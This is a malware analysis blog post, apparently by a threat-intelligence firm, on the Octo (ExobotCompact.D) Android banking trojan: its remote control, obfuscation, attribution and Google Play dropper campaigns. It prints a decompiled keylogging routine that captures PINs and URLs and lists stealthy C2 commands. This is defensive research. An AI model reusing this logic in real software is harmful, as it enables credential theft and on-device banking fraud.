A new on-device fraud Android Banking Trojan with a rich legacy\n\n**threatfabric.com/blogs/octo-new-odf-banking-trojan.html**\n\nApril 2022\n\n\n-----\n\n## Intro\n\nIn mid-2021, a new Android banking malware strain was spotted in the wild. While some AV companies dubbed it\nas a new family with the name “Coper”, ThreatFabric threat intelligence pointed towards it being a direct\ndescendant of the quite well-known malware family Exobot. First observsed in 2016, and based on the source\ncode of the banking Trojan Marcher, Exobot was maintained until 2018 targeting financial institutions with a variety\nof campaigns focused on Turkey, France and Germany as well as Australia, Thailand and Japan. Subsequently, a\n“lite” version of it was introduced, named ExobotCompact by its author, the threat actor known as “android” on\ndark-web forums.\n\nThreatFabric analysts were able to establish a direct connection between ExobotCompact and this newly spotted\nmalware strain, that was dubbed as ExobotCompact.B on our MTI Portal. After some iterations of updates in\nExobotCompact, the latest variant was introduced in November 2021, referred to as ExobotCompact.D.\n\nThe latest activity of this malware family, and actors behind it, involves distribution through several malicious\napplications on Google Play Store. These applications were installed more then 50k+ times and were targeting\nfinancial organisations all over the world, both with broad and generic campaigns with large amount of targets, as\nwell as very narrow and focused campaigns throughout Europe.\n\nOn January 23, 2022, ThreatFabric analysts spotted a post on one of the darknet forums, in which a member was\nlooking for Octo Android botnet. Further analysis, as it will be shown in this blog, uncovered a direct connection\nbetween Octo and ExobotCompact: in fact, ExobotCompact was updated with several features and rebranded to\nOcto. This blog covers details of attribution made by ThreatFabric analysts and provides more details of Modus\nOperandi of this Android banking Trojan.\n\n## On-device fraud is here\n\nThe major update made to ExobotCompact brought remote access capability, thus allowing the threat actors\nbehind the Trojan to perform on-device fraud (ODF). ODF is the most dangerous, risky, and inconspicuous type of\nfraud, where transactions are initiated from the same device that the victim uses every day. In this case, anti-fraud\nengines are challenged to identify the fraudulent activity with significantly smaller number of suspicious indicators\ncompared to other types of fraud performed through different channels\n\n\n-----\n\nIn general, to get remote control over the device, cybercriminals need screen-streaming to see the contents of the\nscreen and some mechanism to execute actions on the device. To establish remote access to the infected device,\nExobotCompact.D relies on built-in services that are part of Android OS: MediaProjection for screen streaming\nand AccessibilityService to perform actions remotely. Even though this solution cannot be deemed completely\nreliable, it is a realistic way to have remote control over the device. Screen streaming with MediaProjection is based\non sending screenshots at high rate (1 per second), which gives operator close to live representation of what is\nhappening on remote device.\n\nWhen ExobotCompact.D receives “start_vnc” command, it parses the configuration sent together with this\ncommand:\n\n**Option** **Description**\n\nSTREAM_SCREEN Enables screen streaming with MediaProjection\n\nBLACK Enables black screen overlay to hide remote actions from victim\n\nSILENT Disables all notifications (no interruption mode), sets screen brightness to 0\n\n“BLACK” and “SILENT” options help to not raise suspicion in victims as all remote actions and events caused by\nthem will be hidden and performed invisibly. Besides screen streaming, ExobotCompact.D is able to read all the\ncontents of the screen, including elements’ ID, type, and location on the screen. Having this information, the actor is\nable to re-create the layout of the screen on the C2 backend and have visibility on the internal structure of any app\ninstalled on the device. This information is later used when interacting with the remote device to point the element\nthat should be interacted with (i.e., clicked).\n\nHaving this real-time visibility, including the internal layout of applications, the operator can send actions to be\nexecuted on the device with the help of the “vnc_tasks” command. The supported actions are listed in the table\nbelow:\n\n**VNC task** **Description**\n\n\n-----\n\n**VNC task** **Description**\n\nclick_at Performs click at specified coordinates X, Y\n\ngesture Performs gesture\n\nset_text Sets specified text in specified element\n\nlong_click Performs long click\n\naction Performs specified action\n\nset_clip Sets clipboard text to specified one\n\npaste Pastes data from clipboard\n\nsend_pattern Performs gesture based on the specified pattern\n\nscroll Performs scroll up/down\n\nWe would like to point out that these set of actions that the Trojan is able to perform on victim’s behalf is sufficient\nto implement (with certain updates made to source code of the Trojan) an Automated Transfer System (ATS). In\nthat case the operator does not have to manually interact with the remote device, but can simply send a sequence\nof actions to execute. Its execution can lead to automatic initiation of fraudulent transactions and its authorization\nwithout manual efforts from the operator, thus allowing fraud on significantly larger scale.\n\n## Octo is the new Exo\n\nAt the time when Octo Android botnet was first mentioned on forums, it was unclear what botnet this was, whether\nit was some new malware family or just some well-known family rebranded.\n\nOn February 3, 2022, another member revealed the owner of Octo botnet, a member of the forum known as\n“Architect”. Later in March Architect confirmed he/she is the owner and seller of Octo botnet:\n\n\n-----\n\nEarlier post by Architect reveals his/her skills. A search by telegram contact reveals another nickname used by\n“Architect” on another forum: “goodluck”.\n\nOn this forum, “goodluck” mentioned that he/she has private Trojan written from scratch on December 10:\n\nWhile investigating Octo botnet, ThreatFabric analysts spotted certain similarities between ExobotCompact features\nand skills of Octo botnet owner, “Architect”:\n\n\n-----\n\nSource code protection from reverse (with native wrapper in C++)  as we will show in this blog,\nExobotCompact uses proprietary payload obfuscation implemented in native library that protects it from\nreverse engineering.\n“Publication in Google Play with 100% approve” – ExobotCompact was seen distributed by several droppers\nuploaded to official Google Play store.\n“Disable Google Protect” – one of the first actions that ExobotCompact makes upon the installation.\n\nAt this point ThreatFabric analysts made a hypothesis that Octo botnet is a rebranding of ExobotCompact, and\n“Architect” is either a new owner of the source code or the same actor who was behind Exobot and\nExobotCompact.A.\n\nTo prove this hypothesis, ThreatFabric analysts examined the supported commands of ExobotCompact, its\ncapabilities and commands available on the administrator panel of Octo banking Trojan.\n\nHere is a summary of our findings:\n\nBoth ExobotCompact and Octo have remote access capability, and it is called “VNC” in both cases.\nOcto panel has six time-based configurations that configure delays before executing some action. This list\nexact matches the same delays that ExobotCompact can receive from C2. Some of the configurations, like\n“minimize_delay” or “get_device_admin_delay” are unique and we have not seen it in other malware except\nExobotCompact.\nThe commands available on the Octo panel are similar to commands supported by ExobotCompact and do\nnot contain any command that is not present in ExobotCompact code.\n\nThus, having these facts in mind, we conclude that ExobotCompact was rebranded to Octo Android banking Trojan\nand is rented by its owner “Architect”, also known as “goodluck”. ThreatFabric tracks this variant as\nExobotCompact.D.\n\n## Other capabilities\n\nAs highlighted in previous section, ExobotCompact/Octo has several notable features that help it to stay under the\nradar and perform on-device fraud (ODF). The full list of Octo capabilities is shown hereunder:\n\n\n-----\n\n### Proprietary payload extraction\n\nAnalyzing the current mobile threats landscape, it is hard to point out a malware family that does not use antidetection and anti-analysis techniques. However, most of threat actors use third-party services that provide\nmalicious payload protection (so-called “cryptors”), while ExobotCompact implements proprietary payload\n**protection developed by its author. ExobotCompact.D uses a native library to decrypt and load the malicious**\npayload, which makes it hard to analyze and detect.\n\nDespite the fact that the idea of using native libraries for obfuscation is not new, the implementation is quite\nunique and was only seen used by ExobotCompact. The author of ExobotCompact pays attention not only to\ndevelopment of the new features, but also to improving the payload protection. First versions of native payload\nobfuscation were rather straightforward: the “decryptor” code was not obfuscated itself, making easy to read and\nanalyze. In the latest versions of this native wrapper author took further step: native code obfuscation. Since a lot of\nanti-virus solutions rely on signature-based detection, this obfuscation makes it harder for them to detect the\nmalicious activity as native code does not contain “suspicious” string signatures.\n\nThe following screenshots show strings in first versions of native wrapper compared to its latest versions:\n\n\n-----\n\nThe obfuscation trick used here is not new and widely used in desktop malware as well as in some Android banking\nTrojans. Strings are created dynamically during the execution of the native code by concatenating it symbol by\nsymbol as seen in the following screenshot:\n\nSuch approach not only makes it difficult to detect the malicious payload but also complicates the analysis and\nautomated processing of such samples, hence showing the maturity of ExobotCompact/Octo author and his/her\nfamiliarity with desktop malware obfuscation techniques.\n\n### Keylogger\n\n\n-----\n\nJust like most modern mobile malware, ExobotCompact is not an exception and features keylogging capability in its\narsenal. This capability is powered by AccessibilityService abuse: applications which have this service enabled can\nreceive all system events (applications start, user input, content displayed on the screen, etc.). ExobotCompact\nuses it to log every action that user makes on the infected device. ExobotCompact.D keylogging feature can\ncapture the following data, among others:\n\nlock pattern/PIN used to unlock the device\nURLs of websites opened in Google Chrome browser\nClicks, including the information about the element clicked\nInput focus changed event\nText changed event The following code snippet shows keylogging procedure:\n```\npublic void keylogging(AccessibilityEvent acsbEvent) {\n  String capturedData = AcsbHelper.gitPinPattern(this.ctx, this.getRootActiveWindow());\n  if(!capturedData.isEmpty()) {\n    String packageName = AcsbService.goto();\n    if(!packageName.isEmpty()) {\n      capturedData = \"Package: \" + packageName + \"; \" + capturedData;\n    }\n    if(packageName.equals(\"com.android.chrome\")) {\n      AccessibilityNodeInfo v1_1 = AcsbHelper.break(this.getRootActiveWindow(), \"url_bar\");\n      if(v1_1 != null) {\n        capturedData = \"URL: \" + v1_1.getText().toString() + \"; \" + capturedData;\n      }\n    }\n    Misc.sendCapturedData(this.ctx, capturedData);\n  }\n  if(!SharedPrefs.getBool(this.ctx, \"keylogger_enabled\", Boolean.FALSE).booleanValue()) {\n    return;\n  }\n  int keylogger_delay = (int)SharedPrefs.getInt(this.ctx, \"keylogger_delay\", Integer.valueOf(0));\n  if(((long)SharedPrefs.getLong(this.ctx, \"uptime\", Long.valueOf(0L))) < ((long)keylogger_delay)) {\n    return;\n  }\n  String v6 = AcsbHelper.parseAcsbEvent(this.ctx, acsbEvent, AcsbService.goto());\n  Misc.writeToKeylog(this.ctx, v6);\n}\n\n### Commands\n\n```\nThe following table contains all the accepted commands that can be sent from the C2:\n\n**Commands** **Description**\n\nblock_push_apps Blocks push notifications from specified applications\n\nblock_push_delay Sets delay before starting to block push notifications\n\nextra_domains Updates list of C2s\n\nget_device_admin_delay Sets delay before attempt to become Device Admin\n\ninjects_delay Sets delay before starting injecting\n\ninjects_list Sets list of targeted applications for overlay attack\n\nintercept_off Disables SMS interception\n\nintercept_on Enables SMS interception\n\nkeylogger_delay Sets delay before starting keylogging\n\nkeylogger enabled Enables/disables keylogger\n\n\n-----\n\n**Commands** **Description**\n\nkill_bot Stops running Trojan\n\nlock_off Stops disabling sound and locking the device screen\n\nlock_on Disables sound and temporarily locks the device screen\n\nminimize_apps Sets list of applications that will be closed with GLOBAL_ACTION_HOME\n\nminimize_delay Sets delay before starting to close applications\n\nnet_delay Sets delay for network requests\n\nopen_url Opens specified URL\n\npush Shows push notification\n\nregister_again Registers bot again\n\nrun_app Launches specified application\n\nsms Sends a text message with specified text from the infected device to the specified\nphone number\n\nstart_fg Starts Foreground mode\n\nstop_fg Stops Foreground mode\n\nstart_keylogger Enables keylogger\n\nstop_keylogger Disables keylogger\n\nuninstall_apps Sets delay before starting to uninstall applications\n\nuninstall_delay Sets list of applications to be uninstalled\n\nussd Executes the specified USSD code\n\nvnc_start Starts remote access session\n\nvnc_stop Stops remote access session\n\nvnc_tasks Updates list of remote actions to execute\n\n## Campaigns and actors\n\nBeing a rental banking Trojan, ExobotCompact.D is used by several threat actors, who maintain different\ncampaigns. Most of them use malicious landing pages to distribute ExobotCompact.D under the guise of some\nsoftware update. However, some of the actors use more inventive approach using dropper app in official Google\nPlay Store. In this section we will cover the most notable actors and campaigns.\n\nOur threat intelligence shows that there are more then 5 different actors behind Octo, presumably including the\nowner him-/herself, based on the different C2 URL paths we have seen used by it. Our investigation of darknet\nforums also reveals several customers of “Architect” / ”goodluck”, more details are available on the full report\n[available to users of our Mobile Threat Intel service.](https://threatfabric.com/free-mti-trial.html)\n\n### Fast Cleaner\n\n\n-----\n\nIn early February 2022 ThreatFabric analysts discovered a dropper on Google Play named Fast Cleaner, which\n[was in fact a sample of GymDrop dropper Trojan, also discovered by ThreatFabric in November 2021. This dropper](https://threatfabric.com/blogs/deceive-the-heavens-to-cross-the-sea.html#alien-campaign)\n[had 50.000+ installations and was seen distributing ExobotCompact.D as well as Alien.A and](https://threatfabric.com/blogs/alien_the_story_of_cerberus_demise.html) [Xenomorph.A:](https://threatfabric.com/blogs/xenomorph-a-newly-hatched-banking-trojan.html)\n\nThis campaign was active almost whole February 2022 and targeted mostly users of European banks from Spain,\nBelgium, Portugal, Italy. The same actor used malicious landing pages to install ExobotCompact.D under the guise\nof browser update:\n\n### Pocket Screencaster and Google Chrome\n\n\n-----\n\nShortly after Fast Cleaner campaign ended, ThreatFabric analysts discovered another GymDrop dropper on\nGoogle Play posing as an application for screen recording. However, unlike previous campaign, this dropper was\nonly seen distributing ExobotCompact.D and no other malware families. Moreover, the dropper itself is allowed to\nbe installed only for users from UK, Poland, Spain, and Portugal. As we have pointed out previously, C2s and its\npaths highly likely correlate with unique threat actors behind ExobotCompact.D. Based on this fact, the same actor\noperates the ongoing campaign where the Trojan is posing as Google Chrome update. This fact explains great\nnumber of overlay targets from almost all over the world: actor is using the same C2 to operate different\ncampaigns, global and focused on European users:\n\n### Financial apps\n\nAnother actor behind ExobotCompact.D seems to be highly focused on customers of several European banks and\nis using their icons and application names to lure victims into installing the application. The specific focus is also\nindicated by a rather short list of targeted applications to perform overlay attack. These applications belong to\nfinancial organizations from Germany and Austria:\n\n\n-----\n\n### Play Store\n\nActor behind this campaign was first using a quite large target list that included around 70 applications, but at the\ntime of writing this report it is also highly focused on customers from specific country (Hungary) and is distributing\nExobotCompact.D under the guise of Play Store update through malicious websites:\n\nBesides abovementioned threat actors there are several actors who use different masks to lure victims into\ninstalling the application, thus launching, and testing different campaigns and different masks. These include\nalready mentioned updates for Google Chrome, financial apps, messengers (i.e., WhatsApp), etc.\n\n\n-----\n\n## Conclusions\n\nExobotCompact.D serves as a great example of modern mobile banking malware. Rebranding to Octo erases\nprevious ties to the Exobot source code leak, inviting multiple threat actors looking for opportunity to rent an\nallegedly new and original Trojan. Its capabilities put at risk not only explicitly targeted applications that are targeted\nby overlay attack, but any application installed on the infected device as ExobotCompact/Octo is able to read\ncontent of any app displayed on the screen and provide the actor with sufficient information to remotely interact with\nit and perform on-device fraud (ODF). Moreover, these includes all authenticator applications that display OTP\ncodes on the screen.\n\nExobotCompact/Octo has dangerous capabilities, powered by inventive distribution schemes including droppers on\nofficial Google Play store and malicious landing pages. Thus, customers are very likely to fall into installing the\nmalware on their devices, allowing the actors to have remote access to their devices and therefore to their banking\naccounts. To properly detect possible ODF we recommend financial institutions to have strong client-side detection\nsolution that can detect malware not only by signatures (ExobotCompact proves that it can be useless), but by its\nmalicious behavior.\n\n## MTI & CSD\n\nOur Mobile Threat Intelligence (MTI) service provides financial institutions with a better visibility on the increasing\nthreat of mobile banking malware. Banks who are using MTI understand which malware campaigns are targeting\ntheir mobile channel and how their mobile banking users are impacted.\n\nWith our Client Side Detection (CSD) service we are helping financial institutions to gain visibility on (potential)\nfraud by mobile banking malware, and to prevent it.
